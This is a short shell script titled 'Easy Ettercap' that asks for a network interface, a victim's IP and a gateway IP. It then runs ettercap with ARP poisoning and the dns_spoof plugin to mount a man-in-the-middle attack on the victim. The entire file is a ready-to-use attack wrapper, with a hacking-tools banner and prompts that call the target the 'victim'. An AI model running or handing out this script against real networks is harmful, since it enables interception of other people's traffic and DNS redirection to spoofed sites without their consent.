#!/bin/sh
echo " _   _            _    _ _              _     "
echo "| | | |          | |  ( ) |            | |    "
echo "| |_| | __ _  ___| | _|/| |_ ___   ___ | |___ "
echo "|  _  |/ _\` |/ __| |/ / | __/ _ \ / _ \| / __|"
echo "| | | | (_| | (__|   <  | || (_) | (_) | \__ \ "
echo "\_| |_/\__,_|\___|_|\_\  \__\___/ \___/|_|___/"
echo ""
echo ""
echo "--------------------------------------------"
echo "Easy Ettercap. Fill next field for easy MITM. :)"
echo "By Baptiste"
echo "V 1.0"
echo "--------------------------------------------"   
read -p "Interface ( etho0, eth1,... ) ? " int    
read -p "Victim's IP ? " vip
read -p "Gateways' IP ? " gip
while true; do
    read -p "Is OK ? Interface : $int Victim's IP : $vip Gateways' IP : $gip " yn
    case $yn in
        [Yy]* ) ettercap -Tqi $int -M arp:remote -P dns_spoof /$vip/ /$gip/; break;;
        [Nn]* ) exit;;
        * ) echo "Please answer yes or no.";;
    esac
done
